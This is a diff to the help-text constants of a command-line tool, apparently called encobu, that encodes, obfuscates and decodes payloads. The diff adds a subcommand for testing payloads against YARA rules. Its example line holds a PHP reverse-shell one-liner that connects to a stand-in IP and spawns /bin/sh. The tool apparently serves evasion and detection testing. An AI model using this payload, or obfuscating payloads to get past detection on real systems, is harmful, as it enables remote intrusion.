@@ -9,6 +9,7 @@ class MainCommand:
     SUB_PARSER_TITLE = "Modes"
     SUB_PARSER_METAVAR = "<COMMAND>"
 
+
 class EncodeSubCommand:
     DESCRIPTION = "Encodes a given payload using standard encoding methods"
     HELP = "Encode a string of text using specific algorithm"
@@ -35,8 +36,11 @@ class EncodeSubCommand:
     KEY_HELP = "The encryption key is required when the method is XOR"
     KEY_METAVAR = "<SECRET_KEY>"
 
+
 class ObfusSubCommand:
-    DESCRIPTION = "Obfuscates the payload using string manipulation and obfuscation algorithms"
+    DESCRIPTION = (
+        "Obfuscates the payload using string manipulation and obfuscation algorithms"
+    )
     HELP = "Obfuscate your payload using specific algorithms"
     EPILOG = """
     EXAMPLES:
@@ -62,10 +66,13 @@ class ObfusSubCommand:
     OPERATOR_HELP = "Concatenation operator to be used with Split and Concatenation algorithm (default: %(default)s)"
     OPERATOR_METAVAR = "<OPERATOR>"
 
-    ESCAPE_TYPE_HELP = "Escape sequence to use (default: %(default)s)(choices: %(choices)s)"
+    ESCAPE_TYPE_HELP = (
+        "Escape sequence to use (default: %(default)s)(choices: %(choices)s)"
+    )
     ESCAPE_TYPE_METAVAR = "<ESCAPE_TYPE>"
 
     POLY_HELP = "Enables polymorphic escaping for escape-sequence algorithm"
+
 
 class DecodingSubCommand:
     DESCRIPTION = "Decodes a given payload or a file using standard decoding methods"
@@ -91,6 +98,7 @@ class DecodingSubCommand:
 
     KEY_HELP = "The encryption key is required when the method is XOR"
     KEY_METAVAR = "<SECRET_KEY>"
+
 
 class DeobfusSubCommand:
     DESCRIPTION = "De-obfuscates the payload using string manipulation and de-obfuscation algorithms"
@@ -118,3 +126,19 @@ class DeobfusSubCommand:
 
     OPERATOR_HELP = "Concatenation operator to be used with split and concatenation algorithm (default: %(default)s)"
     OPERATOR_METAVAR = "<OPERATOR>"
+
+
+class TestSubCommand:
+    DESCRIPTION = "Test different payloads against yara static rules"
+    HELP = "Use this command to test the effectiveness of different encoded and obfuscated payloads against simple yara static rules"
+    EPILOG = """
+    EXAMPLES:
+        encobu test -P "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" -r reverse_shell.yara
+        encobu deobfus -F hack.txt -r commands.yara
+    """
+
+    PAYLOAD_HELP = "The payload you want to test against different yara rules"
+    PAYLOAD_METAVAR = "<PAYLOAD>"
+
+    FILE_HELP = "The file you want to test against different yara rules"
+    FILE_METAVAR = "<FILE>"
